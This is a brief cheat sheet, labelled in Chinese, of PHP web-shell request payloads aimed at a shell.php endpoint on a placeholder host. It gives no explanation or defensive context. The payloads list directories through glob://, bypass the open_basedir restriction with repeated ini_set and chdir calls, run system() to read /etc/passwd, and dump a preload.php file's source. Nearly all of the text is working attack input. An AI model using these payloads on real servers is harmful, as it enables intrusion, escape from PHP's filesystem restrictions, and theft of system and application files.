	第一种
	http://x.com/shell.php?a=$a=new DirectoryIterator("glob:///*");foreach($a as $f){echo($f->__toString().' ');};
	http://x.com/shell.php?a=if%20(%20$b%20=%20opendir(%22glob:///var/www/html/*.php%22)%20)%20{while%20(%20($file%20=%20readdir($b))%20!==%20false%20)%20{echo%20%22filename:%22.$file.%22\n%22;}closedir($b);}
	第二种
	http://x.com/shell.php?a=ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');system('cat ../../../../../etc/passwd');
	http://x.com/shell.php?a=mkdir(%22/tmp/crispr%22);chdir(%27/tmp/crispr/%27);ini_set(%27open_basedir%27,%27..%27);chdir(%27..%27);chdir(%27..%27);chdir(%27..%27);chdir(%27..%27);ini_set(%27open_basedir%27,%27/%27);print_r(scandir(%27.%27))
	第三种
	命令执行绕过
	读文件
	?a=show_source('preload.php');
	?a=echo(readfile('preload.php'));
	?a=print_r(readfile('preload.php'));
	?a=echo(file_get_contents('preload.php'));
	?a=print_r(file_get_contents('preload.php'));